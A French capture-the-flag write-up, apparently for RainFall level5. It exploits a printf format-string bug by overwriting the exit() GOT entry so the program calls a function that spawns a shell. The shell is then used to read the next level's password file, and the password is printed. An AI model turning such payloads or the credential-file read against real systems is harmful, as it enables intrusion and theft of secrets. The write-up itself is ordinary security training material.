---------> On va continuer d'exploiter printf(buff) mais cette fois ci
---------> on va reecrire sur le pointeur de la routine exit() qui se trouve en 0x8048360
---------> et on va appeler la fonction <o> a la place :).
$ objdump -d ./level5
080484a4 <o>:
 80484a4:	55						push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55						push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00
 80484dc:	8d 85 f8 fd ff ff		lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55						push   %ebp
 8048505:	89 e5                	mov    %esp,%ebp
 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave
 8048510:	c3                   	ret

---------> Pour cela on recupere l'offset de argv[1] dans printf:
level5@RainFall:~$ python -c 'print "AAAA" + "..%p"*10' | ./level5
AAAA..0x200..0xb7fd1ac0..0xb7ff37d0..0x41414141..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e

---------> Offset a 4.
---------> On va reutiliser la meme technique qu'au level precedent
---------> a savoir reecrire la valeur d'exit  avec la valeur de <o>.
--------->
--------->Inspectons la GoT:
level5@RainFall:~$ objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main

---------> On va donc écrire à l'addresse 0x08049838, 
---------> c'est la que se trouve le pointeur qui mène à la routine exit.
---------> Essayons:
(gdb) echo r
Starting program: /home/user/level5/level5
python -c 'print "\x08\x04\x98\x38"[::-1]+"%4$n"'
8�

Program received signal SIGSEGV, Segmentation fault.
level5@RainFall:~$ 0x00000004 in ?? ()

---------> Cool on ecrit bien la ou il faut.
---------> Maintenant avec les %hn:
(gdb) echo r
python -c 'print "\x08\x04\x98\x38"[::-1]+"%4$hn"'
8�

Program received signal SIGSEGV, Segmentation fault.
0x08040004 in ?? ()

--------> On remarque 3 choses:
--------> 1. On a bien reecrit l'appel d'exit.
--------> 2. On a bien reecrit 0x4 au deux derniers octets.
--------> 2. On a pas besoin de reecrire les 2 premiers octets car ils sont deja egaux a 0x804.
--------
--------> Du coup si on ecrit 0x84a4 - 0x4 = 84a0 (soit 33952) on pourra appeler <o> au lieu d' <exit>:
(gdb) echo r
python -c 'print "\python -c 'print "\x08\x04\x98\x38"[::-1]+"%33952x%4$hn"'
                                                 200
ls
level5@RainFall:~$ /bin/sh: 1: level5: not found

-------> pas de segfault !!! On essaye sans gdb et <o> fait appel a <system> du coup
-------> on fou tout dans un fichier et on lance avec cat -:
level5@RainFall:~$ python -c 'print "\x08\x04\x98\x38"[::-1]+"%33952x%4$hn"' > /tmp/titi
level5@RainFall:~$ cat /tmp/titi - | ./level5
ls
ls: cannot open directory .: Permission denied
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31


over.
